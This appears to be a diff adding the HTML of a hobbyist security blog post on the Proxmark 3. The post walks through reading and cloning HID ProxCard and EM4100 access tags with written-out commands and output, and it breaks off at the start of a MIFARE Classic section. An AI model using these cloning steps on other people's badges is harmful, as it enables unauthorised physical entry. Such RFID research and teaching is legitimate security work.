@@ -1,0 +1,911 @@
+<html lang="en" class="dark-mode"><head><link id="giscus-css" rel="stylesheet" href="https://giscus.app/default.css">
+
+    <title>RFID Hacking with The Proxmark 3</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=189d2e264f">
+
+    <link rel="canonical" href="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/amp/">
+    
+    <meta property="og:site_name" content="Kevin Chung">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="RFID Hacking with The Proxmark 3">
+    <meta property="og:description" content="Radio-frequency identification (RFID) is a widely used technology for the
+tracking and identification of objects that have been &quot;tagged&quot; with small RFID
+tags. These tags often come in the shape of little keychains, cards, and
+stickers. They can be seen in many different kind of systems and are often
+relied">
+    <meta property="og:url" content="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/">
+    <meta property="og:image" content="https://blog.kchung.co/content/images/2017/05/proxmark_laptop.jpg">
+    <meta property="article:published_time" content="2017-05-30T00:00:39.000Z">
+    <meta property="article:modified_time" content="2021-04-03T18:44:08.000Z">
+    <meta property="article:tag" content="rfid">
+    <meta property="article:tag" content="hacking">
+    <meta property="article:tag" content="proxmark3">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="RFID Hacking with The Proxmark 3">
+    <meta name="twitter:description" content="Radio-frequency identification (RFID) is a widely used technology for the
+tracking and identification of objects that have been &quot;tagged&quot; with small RFID
+tags. These tags often come in the shape of little keychains, cards, and
+stickers. They can be seen in many different kind of systems and are often
+relied">
+    <meta name="twitter:url" content="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/">
+    <meta name="twitter:image" content="https://blog.kchung.co/content/images/2017/05/proxmark_laptop.jpg">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Kevin Chung">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="rfid, hacking, proxmark3">
+    <meta name="twitter:site" content="@kchungco">
+    <meta property="og:image:width" content="3264">
+    <meta property="og:image:height" content="2448">
+    
+    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-25DFHFQ416&amp;cx=c&amp;_slc=1"></script><script async="" src="https://www.google-analytics.com/analytics.js"></script><script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Kevin Chung",
+        "url": "https://blog.kchung.co/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.kchung.co/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Kevin Chung",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://blog.kchung.co/content/images/2021/04/kchung.jpg",
+            "width": 480,
+            "height": 480
+        },
+        "url": "https://blog.kchung.co/author/kchung/",
+        "sameAs": []
+    },
+    "headline": "RFID Hacking with The Proxmark 3",
+    "url": "https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/",
+    "datePublished": "2017-05-30T00:00:39.000Z",
+    "dateModified": "2021-04-03T18:44:08.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://blog.kchung.co/content/images/2017/05/proxmark_laptop.jpg",
+        "width": 3264,
+        "height": 2448
+    },
+    "keywords": "rfid, hacking, proxmark3",
+    "description": "Radio-frequency identification (RFID) is a widely used technology for the\ntracking and identification of objects that have been &quot;tagged&quot; with small RFID\ntags. These tags often come in the shape of little keychains, cards, and\nstickers. They can be seen in many different kind of systems and are often\nrelied upon instead of keys or cash money.\n\nI personally find wireless technologies very interesting and especially love\nRFID systems so during my research for the HID iClass system\n[https://blog.kch",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://blog.kchung.co/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.26">
+    <link rel="alternate" type="application/rss+xml" title="Kevin Chung" href="https://blog.kchung.co/rss/">
+    <script defer="" src="https://cdn.jsdelivr.net/ghost/portal@~2.22/umd/portal.min.js" data-ghost="https://blog.kchung.co/" data-key="4be01618842535acd7610c1b97" data-api="https://blog.kchung.co/ghost/api/content/" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer="" src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="4be01618842535acd7610c1b97" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.kchung.co/" crossorigin="anonymous"></script>
+    <script defer="" src="/public/cards.min.js?v=189d2e264f"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=189d2e264f">
+    <script defer="" src="/public/member-attribution.min.js?v=189d2e264f"></script>
+    <script>document.documentElement.classList.add('dark-mode');</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.1/styles/github-gist.min.css">
+<style>  
+    .gh-content pre {
+        background: none !important;
+    }
+    blockquote p {
+        font-size: inherit !important;
+    }
+    /*
+  pre {
+    word-wrap: normal;
+    -moz-hyphens: none;
+    -ms-hyphens: none;
+    -webkit-hyphens: none;
+    hyphens: none;
+    font-size: 0.7em;
+    line-height: 1.3em;
+    margin: 0 0 1.75em 0 !important;
+}
+
+pre code, pre tt {  
+    white-space: pre;
+}
+code[class*="language-"], pre[class*="language-"] {  
+    line-height: 1.2em;
+}
+:not(pre) > code[class*="language-"], pre[class*="language-"] {
+    background: #F7FAFB;
+}
+    */
+    /*
+.post .post-content figcaption {
+    font-weight: 400;
+    font-style: italic;
+    font-size: 16px;
+    line-height: 1.3;
+    color: #666665;
+    outline: 0;
+    z-index: 300;
+    text-align: center;
+}
+    */
+</style>  
+<style>
+.alert {
+  position: relative;
+  padding: 1rem 1rem;
+  margin-bottom: 1rem;
+  border: 1px solid transparent;
+  border-radius: 0.25rem;
+}
+
+.alert-heading {
+  color: inherit;
+}
+
+.alert-link {
+  font-weight: 700;
+}
+
+.alert-dismissible {
+  padding-right: 3rem;
+}
+.alert-dismissible .btn-close {
+  position: absolute;
+  top: 0;
+  right: 0;
+  z-index: 2;
+  padding: 1.25rem 1rem;
+}
+
+.alert-primary {
+  color: #084298;
+  background-color: #cfe2ff;
+  border-color: #b6d4fe;
+}
+.alert-primary .alert-link {
+  color: #06357a;
+}
+
+.alert-secondary {
+  color: #41464b;
+  background-color: #e2e3e5;
+  border-color: #d3d6d8;
+}
+.alert-secondary .alert-link {
+  color: #34383c;
+}
+
+.alert-success {
+  color: #0f5132;
+  background-color: #d1e7dd;
+  border-color: #badbcc;
+}
+.alert-success .alert-link {
+  color: #0c4128;
+}
+
+.alert-info {
+  color: #055160;
+  background-color: #cff4fc;
+  border-color: #b6effb;
+}
+.alert-info .alert-link {
+  color: #04414d;
+}
+
+.alert-warning {
+  color: #664d03;
+  background-color: #fff3cd;
+  border-color: #ffecb5;
+}
+.alert-warning .alert-link {
+  color: #523e02;
+}
+
+.alert-danger {
+  color: #842029;
+  background-color: #f8d7da;
+  border-color: #f5c2c7;
+}
+.alert-danger .alert-link {
+  color: #6a1a21;
+}
+
+.alert-light {
+  color: #636464;
+  background-color: #fefefe;
+  border-color: #fdfdfe;
+}
+.alert-light .alert-link {
+  color: #4f5050;
+}
+
+.alert-dark {
+  color: #141619;
+  background-color: #d3d3d4;
+  border-color: #bcbebf;
+}
+.alert-dark .alert-link {
+  color: #101214;
+}
+</style><style>:root {--ghost-accent-color: #15171A;}</style>
+
+<style>
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsInNvdXJjZVJvb3QiOiIifQ== */</style><style>
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsInNvdXJjZVJvb3QiOiIifQ== */</style><style>.App{text-align:center}.App-logo{height:40vmin;pointer-events:none}@media (prefers-reduced-motion: no-preference){.App-logo{animation:App-logo-spin infinite 20s linear}}.App-header{background-color:#282c34;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:calc(10px + 2vmin);color:#fff}.App-link{color:#61dafb}@keyframes App-logo-spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
+</style><style id="fit-vids-style">.fluid-width-video-container{flex-grow: 1;width:100%;}.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+<body class="post-template tag-rfid tag-hacking tag-proxmark3 is-head-left-logo has-cover is-dropdown-loaded">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head outer">
+        <div class="gh-head-inner inner">
+            <div class="gh-head-brand">
+                <a class="gh-head-logo no-image" href="https://blog.kchung.co">
+                        Kevin Chung
+                </a>
+                <button class="gh-search gh-icon-btn" data-ghost-search=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+                <button class="gh-burger"></button>
+            </div>
+
+            <nav class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="https://blog.kchung.co">Home</a></li>
+    <li class="nav-github"><a href="https://github.com/ColdHeat">Github</a></li>
+    <li class="nav-twitter"><a href="https://twitter.com/kchungco">Twitter</a></li>
+</ul>
+
+            </nav>
+
+            <div class="gh-head-actions">
+                    <button class="gh-search gh-icon-btn" data-ghost-search=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+                    <div class="gh-head-members">
+                                <a class="gh-head-link gh-portal-close" href="#/portal/signin" data-portal="signin">Sign in</a>
+                                <a class="gh-head-button gh-portal-close" href="#/portal/signup" data-portal="signup">Subscribe</a>
+                    </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="site-content">
+        
+
+
+
+<main id="site-main" class="site-main">
+<article class="article post tag-rfid tag-hacking tag-proxmark3 ">
+
+    <header class="article-header gh-canvas">
+
+        <div class="article-tag post-card-tags">
+                <span class="post-card-primary-tag">
+                    <a href="/tag/rfid/">rfid</a>
+                </span>
+        </div>
+
+        <h1 class="article-title">RFID Hacking with The Proxmark 3</h1>
+
+
+        <div class="article-byline">
+        <section class="article-byline-content">
+
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="/author/kchung/" class="author-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2021/04/kchung.jpg" alt="Kevin Chung">
+                    </a>
+                </li>
+            </ul>
+
+            <div class="article-byline-meta">
+                <h4 class="author-name"><a href="/author/kchung/">Kevin Chung</a></h4>
+                <div class="byline-meta-content">
+                    <time class="byline-meta-date" datetime="2017-05-29">May 29, 2017</time>
+                        <span class="byline-reading-time"><span class="bull">•</span> 13 min read</span>
+                </div>
+            </div>
+
+        </section>
+        </div>
+
+            <figure class="article-image">
+                <img srcset="/content/images/size/w300/2017/05/proxmark_laptop.jpg 300w,
+                            /content/images/size/w600/2017/05/proxmark_laptop.jpg 600w,
+                            /content/images/size/w1000/2017/05/proxmark_laptop.jpg 1000w,
+                            /content/images/size/w2000/2017/05/proxmark_laptop.jpg 2000w" sizes="(min-width: 1400px) 1400px, 92vw" src="/content/images/size/w2000/2017/05/proxmark_laptop.jpg" alt="RFID Hacking with The Proxmark 3">
+            </figure>
+
+    </header>
+
+    <section class="gh-content gh-canvas">
+        <!--kg-card-begin: markdown--><p>Radio-frequency identification (RFID) is a widely used technology for the tracking and identification of objects that have been "tagged" with small RFID tags. These tags often come in the shape of little keychains, cards, and stickers. They can be seen in many different kind of systems and are often relied upon instead of keys or cash money.</p>
+<p>I personally find wireless technologies very interesting and especially love RFID systems so during my <a href="https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/">research for the HID iClass system</a> it became prudent to buy a Proxmark 3.</p>
+<h1 id="proxmark3">Proxmark 3</h1>
+<blockquote>
+<p>The Proxmark III is a device developed by Jonathan Westhues that enables sniffing, reading and cloning of RFID (Radio Frequency Identification) tags.</p>
+</blockquote>
+<p><img src="https://blog.kchung.co/content/images/2017/05/proxmark-1.jpg" alt="Photo Credit to Rysc Corp" loading="lazy"></p>
+<p>The Proxmark III (PM3) is the defacto RFID research tool. There are other alternative tools but none have the community and prevalence of the PM3. It's capable of reading, writing, and emulating many of the currently available RFID tags. In addition, there is a <a href="http://proxmark.org/forum/index.php">quiet community forum</a> where some highly-technical volunteers share custom Proxmark firmwares and much needed information about RFID research.</p>
+<p>If you are serious about researching RFID systems, you need a Proxmark 3. There's no question about it.</p>
+<h2 id="gettingaproxmark">Getting a Proxmark</h2>
+<p>The Proxmark website <a href="http://www.proxmark.org/?order">lists a few retailers</a> where you can purchase a PM3 but I'll discuss how I got mine and what I paid for it.</p>
+<hr>
+<h6 id="coupon">Coupon</h6>
+<p>Sam from <a href="https://lab401.com/">Lab401</a> reached out and offered a coupon code for a Proxmark 3 from their store for my readers!</p>
+<p>Use code <code>CHUNG401</code> for a 50 euros/dollars discount on a cart with a <a href="https://lab401.com/proxmark/8-proxmark-3-rdv2.html">Proxmark 3</a>, <a href="https://lab401.com/mifare/10-mifare-4k-uid-modifiable.html">MIFARE 4K tags</a>, and <a href="https://lab401.com/ultralight/11-ultralight-uid-modifiable.html">Ultralight UID tags</a>.</p>
+<hr>
+<p>For one thing, I purchased the RDV2 version of the Proxmark which isn't the open source version but makes some improvements over the initial release. Notably it's smaller, has support for a battery, and uses MMCX cables instead of USB cables.</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/IMG_0577.png" alt="My Proxmark 3 RDV2" loading="lazy"></p>
+<p>You can purchase a PM3 from a couple of different sites and I think <a href="https://store.ryscc.com/">Rysc Corp</a> is the most reputable in the US but I actually purchased my PM3 from <a href="http://www.elechouse.com/elechouse/index.php?main_page=product_info&amp;cPath=90_93&amp;products_id=2264">Elechouse</a> in Hong Kong for a total of $248 after shipping. At Rysc Corp a Proxmark (RDV2 or not) costs at least $299 before shipping.</p>
+<p>It cost $212.00 for the actual PM3 RDV2 and $36.30 for shipping to the US for a total of $248.30.</p>
+<p>Looking back, it's actually possible to save a couple more bucks by going to <a href="https://www.aliexpress.com/wholesale?catId=0&amp;initiative_id=SB_20170529133012&amp;SearchText=Proxmark">AliExpress</a> and buying the RDV2 there for about $190 with free shipping or the even cheaper "Proxmark 3 Easy".</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/proxmark_easy.jpg" alt="Proxmark 3 Easy" loading="lazy"></p>
+<p>The PM3 Easy is a pretty cheap version of the Proxmark that costs about $100 but sacrifices some features:</p>
+<blockquote>
+<p>This is a version intended for the chinese domestic market only, so has a few features removed:</p>
+<ol>
+<li>AT91SAM7S256 (smaller memory 256kb)</li>
+<li>Removed lithium battery management and socket.</li>
+<li>Removed some components such as Relay and the Amplifier</li>
+<li>Use different antenna connection.<br>
+~ <a href="http://www.proxmark.org/forum/viewtopic.php?pid=26491#p26491">Proxmark Forums Post by kwx</a></li>
+</ol>
+</blockquote>
+<p>Overall, the original Proxmark 3 design is obsolete and you should go with one of the newer designs from Elechouse.</p>
+<h1 id="proxmark3setup">Proxmark 3 Setup</h1>
+<p>There's a number of resources for setting up a PM3 and in terms of hardware it will differ slightly depending on your model.</p>
+<p>The original PM3 has USB antennaes that you can detach and reattach at will. You should not do this on the RDV2. With the RDV2 after you connect the MMCX cables, you should leave them attached and screw in the antenna modules into the main body.</p>
+<p>I did not do this and one antenna is now hot-glued to the MMCX cable.</p>
+<p>Once everything is attached you should follow the <a href="https://github.com/Proxmark/proxmark3/wiki">PM3 wiki</a> for setting up the PM3 firmware. To the best of my knowledge all released Proxmarks use the same firmware so there shouldn't be much model based difference in terms of software.</p>
+<p>I won't get into the software setup too much because it's very involved and I won't be able to do a better job than the wiki. However, I will say that at some point the PM3 changed from a USB interface to a serial interface for performance reasons. The serial interface is finicky and can have problems running in a virtual machine.</p>
+<p>If you do decide to use a VM, I've had more success with Linux than Windows and in Windows, for some reason I can't explain, the PM3 client only works when I use the <a href="http://proxmark.org/forum/viewtopic.php?id=1562">GUI</a>. But at the moment, I use a Windows 7 VM and the GUI as my PM3 interface.</p>
+<p>Overall, flashing the PM3 can be an annoying process that you really only want to have to do once or twice.</p>
+<h1 id="rfidtechnologies">RFID Technologies</h1>
+<p>There are a number of RFID authentication technologies common in the US and I've encountered four in my day to day life:</p>
+<ul>
+<li>HID iClass (13.56 MHz)</li>
+<li>HID ProxCard (125 kHz)</li>
+<li>EM4100x (125 kHz)</li>
+<li>MIFARE Classic (13.56 MHz)</li>
+</ul>
+<p>We're going to break down the last three because I <a href="https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/">already covered how to read/write iClass cards</a>.</p>
+<p>With some assorted unknown RFID tags and cards we'll try to clone/modify the contents of each. First we need to figure out what technology is behind each card. Generally you can research this information online through serial numbers, manufacturer information, and datasheets.</p>
+<p>But with the PM3 you can take a shortcut and run <code>lf search</code> or <code>hf search</code>. These two commands will search for supported RFID tags in the low frequency (125 kHz) and the high frequency (13.56 MHz) range respectively.</p>
+<h2 id="hidproxcard">HID ProxCard</h2>
+<p>Let's take a look at the more popular HID ProxCard.</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/IMG_0584.png" alt="For the Proxcard the numbers on the card are the contents" loading="lazy"></p>
+<p>On the front of the card it has some numbers and the words "HID Proximity". With some Googling we can ascertain that this is an HID ProxCard which we can clone with some Proxmark commands.</p>
+<p>To start off we can search for a supported tag with <code>lf search</code>:</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">proxmark3</span>&gt; lf search
+<span class="hljs-comment">#db# DownloadFPGA(len: 42096)</span>
+<span class="hljs-attribute">Reading</span> <span class="hljs-number">30000</span> bytes from device memory
+<span class="hljs-attribute">Data</span> fetched
+<span class="hljs-attribute">Samples</span> @ <span class="hljs-number">8</span> bits/smpl, decimation <span class="hljs-number">1</span>:<span class="hljs-number">1</span>
+<span class="hljs-attribute">NOTE</span>: some demods output possible binary
+  <span class="hljs-attribute">if</span> it finds something that looks like a tag
+<span class="hljs-attribute">False</span> Positives ARE possible
+<span class="hljs-attribute">Checking</span> for known tags:
+<span class="hljs-attribute">HID</span> Prox TAG ID: <span class="hljs-number">2004263</span>f<span class="hljs-number">88</span> (<span class="hljs-number">8132</span>) - Format Len: <span class="hljs-number">26</span>bit - FC: <span class="hljs-number">19</span> - Card: <span class="hljs-number">8132</span>
+<span class="hljs-attribute">Valid</span> HID Prox ID Found!
+</code></pre>
+<p>Knowing that it's definitely a ProxCard we can upgrade to the HID specific commands. We already know the Tag ID (<code>2004263f88</code>) but we can run <code>lf hid fskdemod</code> to read Proxcards continuously (Push the button on the PM3 to stop scanning):</p>
+<pre><code class="hljs shell"><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> lf hid fskdemod</span> 
+<span class="hljs-meta">#</span><span class="bash">db<span class="hljs-comment"># TAG ID: 2004263f88 (8132) - Format Len: 26bit - FC: 19 - Card: 8132</span></span>                             
+<span class="hljs-meta">#</span><span class="bash">db<span class="hljs-comment"># Stopped</span></span>
+</code></pre>
+<p>This Tag ID is directly encoded from the Facility Code (19) and Card ID (8132). You can use some of the <a href="https://www.brivo.com/support/card-calculator">online 26 bit Wiegand calculators</a> online to double check this for yourself.</p>
+<p>This effectively means that you only need to know those numbers (which are printed on the card itself) to clone the card.</p>
+<p>Most low frequency tags don't have any kind of complex authentication scheme or any protection against replay attacks. It's a simple matter to scan an existing working card and create a clone. With a high powered reader, one can <a href="https://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/">steal RFID tags from multiple feet away</a>.</p>
+<p>With the Tag ID in hand, we now need a blank RFID card that we can clone the Tag ID onto. The best card for this is the <a href="https://www.amazon.com/gp/product/B017IP85YW/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B017IP85YW&amp;linkCode=as2&amp;tag=amzref0f-20&amp;linkId=dbfc33ecb4a5609e5e1624b27923dc6c">T5577</a> which can emulate a variety of low frequency cards including the two being discussed here (HID ProxCard, EM41000).</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/IMG_0586.png" alt="I keep T5577 tags in a variety of forms but I get the most requests for keyfobs" loading="lazy"></p>
+<p>With the Tag ID in hand and T5577 ready we can clone simply with:</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">proxmark3</span>&gt; lf hid clone <span class="hljs-number">2004263</span>f<span class="hljs-number">88</span> 
+<span class="hljs-attribute">Cloning</span> tag with ID <span class="hljs-number">2004263</span>f<span class="hljs-number">88</span>
+<span class="hljs-comment">#db# DONE!</span>
+</code></pre>
+<p>Now the T5577 tag should function as an identical clone to the original ProxCard!</p>
+<p>In addition to reading and writing, the PM3 is also capable of simulating an RFID tag but it really isn't as intuitive as one would like. You generally need to have a computer of some sort connected to the PM3 and have the ability to run commands. The simulation could be useful to a pentester, but reading and writing is all most people need.</p>
+<h1 id="em4100">EM4100</h1>
+<p>The EM4100 cards are not as common as the HID ProxCard but it shows up sometimes and nonetheless the PM3 supports it.</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/IMG_0579.png" alt="This time I got a fob instead of a card" loading="lazy"></p>
+<p>We continue once again with the <code>lf search</code> command:</p>
+<pre><code class="hljs yaml"><span class="hljs-string">proxmark3&gt;</span> <span class="hljs-string">lf</span> <span class="hljs-string">search</span>
+<span class="hljs-comment">#db# DownloadFPGA(len: 42096)</span>
+<span class="hljs-string">Reading</span> <span class="hljs-number">30000</span> <span class="hljs-string">bytes</span> <span class="hljs-string">from</span> <span class="hljs-string">device</span> <span class="hljs-string">memory</span>
+<span class="hljs-string">Data</span> <span class="hljs-string">fetched</span>
+<span class="hljs-string">Samples</span> <span class="hljs-string">@</span> <span class="hljs-number">8</span> <span class="hljs-string">bits/smpl,</span> <span class="hljs-string">decimation</span> <span class="hljs-number">1</span><span class="hljs-string">:1</span>
+<span class="hljs-attr">NOTE:</span> <span class="hljs-string">some</span> <span class="hljs-string">demods</span> <span class="hljs-string">output</span> <span class="hljs-string">possible</span> <span class="hljs-string">binary</span>
+  <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">finds</span> <span class="hljs-string">something</span> <span class="hljs-string">that</span> <span class="hljs-string">looks</span> <span class="hljs-string">like</span> <span class="hljs-string">a</span> <span class="hljs-string">tag</span>
+<span class="hljs-literal">False</span> <span class="hljs-string">Positives</span> <span class="hljs-string">ARE</span> <span class="hljs-string">possible</span>
+<span class="hljs-attr">Checking for known tags:</span>
+<span class="hljs-attr">EM410x pattern found:</span>
+<span class="hljs-attr">EM TAG ID      :</span> <span class="hljs-number">8800180E55</span>
+<span class="hljs-attr">Unique TAG ID  :</span> <span class="hljs-string">11001870AA</span>
+<span class="hljs-string">Possible</span> <span class="hljs-string">de-scramble</span> <span class="hljs-string">patterns</span>
+<span class="hljs-string">HoneyWell</span> <span class="hljs-string">IdentKey</span> {
+<span class="hljs-attr">DEZ 8          :</span> <span class="hljs-number">01576533</span>
+<span class="hljs-attr">DEZ 10         :</span> <span class="hljs-number">0001576533</span>
+<span class="hljs-attr">DEZ 5.5        :</span> <span class="hljs-number">00024.03669</span>
+<span class="hljs-attr">DEZ 3.5A       :</span> <span class="hljs-number">136.03669</span>
+<span class="hljs-attr">DEZ 3.5B       :</span> <span class="hljs-number">000.03669</span>
+<span class="hljs-attr">DEZ 3.5C       :</span> <span class="hljs-number">024.03669</span>
+<span class="hljs-attr">DEZ 14/IK2     :</span> <span class="hljs-number">00584117128789</span>
+<span class="hljs-attr">DEZ 15/IK3     :</span> <span class="hljs-number">000073016045738</span>
+<span class="hljs-attr">DEZ 20/ZK      :</span> <span class="hljs-number">01010000010807001010</span>
+}
+<span class="hljs-attr">Other          :</span> <span class="hljs-string">03669_024_01576533</span>
+<span class="hljs-attr">Pattern Paxton :</span> <span class="hljs-number">2284604501</span> [<span class="hljs-number">0x882C4C55</span>]
+<span class="hljs-attr">Pattern 1      :</span> <span class="hljs-number">4457436</span> [<span class="hljs-number">0x4403DC</span>]
+<span class="hljs-attr">Pattern Sebury :</span> <span class="hljs-number">3669 </span><span class="hljs-number">24</span> <span class="hljs-number">1576533</span>  [<span class="hljs-number">0xE55</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x180E55</span>]
+<span class="hljs-string">Valid</span> <span class="hljs-string">EM410x</span> <span class="hljs-string">ID</span> <span class="hljs-string">Found!</span>
+</code></pre>
+<p>Knowing that it's a EM4100 we can proceed to the more specific EM4100 RFID commands and read the Tag ID:</p>
+<pre><code class="hljs less"><span class="hljs-selector-tag">proxmark3</span>&gt; <span class="hljs-selector-tag">lf</span> <span class="hljs-selector-tag">em4x</span> <span class="hljs-selector-tag">em410xdemod</span> <span class="hljs-selector-tag">1</span>
+
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">DownloadFPGA</span>(<span class="hljs-attribute">len</span>: <span class="hljs-number">42096</span>)
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">EM</span> <span class="hljs-selector-tag">TAG</span> <span class="hljs-selector-tag">ID</span>: <span class="hljs-selector-tag">8800180e55</span> <span class="hljs-selector-tag">-</span> (<span class="hljs-number">03669</span>_024_01576533)
+</code></pre>
+<p>And once again with the Tag ID in hand we can write it to a T5577.</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">proxmark3</span>&gt; lf em<span class="hljs-number">4</span>x em<span class="hljs-number">410</span>xwrite <span class="hljs-number">8800180</span>e<span class="hljs-number">55</span> <span class="hljs-number">1</span>
+<span class="hljs-attribute">Writing</span> T<span class="hljs-number">55</span>x<span class="hljs-number">7</span> tag with UID <span class="hljs-number">0</span>x<span class="hljs-number">8800180</span>e<span class="hljs-number">55</span> (clock rate: <span class="hljs-number">64</span>)
+
+<span class="hljs-comment">#db# Started writing T55x7 tag ...</span>
+<span class="hljs-comment">#db# Clock rate: 64</span>
+<span class="hljs-comment">#db# Tag T55x7 written with 0xffc62000e20ea94e</span>
+</code></pre>
+<p>Most low frequency RFID tags are child's play to read/write/clone/emulate with the Proxmark 3.</p>
+<p>Next we'll take a look at a card that is a little more complicated but ultimately broken, the MIFARE Classic.</p>
+<h1 id="mifareclassic">MIFARE Classic</h1>
+<p>The MIFARE Classic is a very popular RFID card that's in many different operations like bus fare cards, laundry cards, or ID cards. They're very widespread and unfortunately, very broken.</p>
+<p>We're going to use the high frequency antenna to read our high frequency MIFARE card.</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/IMG_0578.png" alt="In my experience the HF antenna tends to be glitchier than the LF antennae" loading="lazy"></p>
+<p>Let's start off with <code>hf search</code> to try and identify our card:</p>
+<p><img src="https://blog.kchung.co/content/images/2017/05/IMG_0581.png" alt="The card is actually not blank on the other side but it has too much information on it" loading="lazy"></p>
+<pre><code class="hljs apache"><span class="hljs-attribute">proxmark3</span>&gt; hf search
+<span class="hljs-comment">#db# DownloadFPGA(len: 42096)</span>
+ <span class="hljs-attribute">UID</span> : bc <span class="hljs-number">4</span>e a<span class="hljs-number">5</span> <span class="hljs-number">35</span>
+<span class="hljs-attribute">ATQA</span> : <span class="hljs-number">00</span> <span class="hljs-number">04</span>
+ <span class="hljs-attribute">SAK</span> : <span class="hljs-number">08</span><span class="hljs-meta"> [2]</span>
+<span class="hljs-attribute">TYPE</span> : NXP MIFARE CLASSIC <span class="hljs-number">1</span>k | Plus <span class="hljs-number">2</span>k SL<span class="hljs-number">1</span>
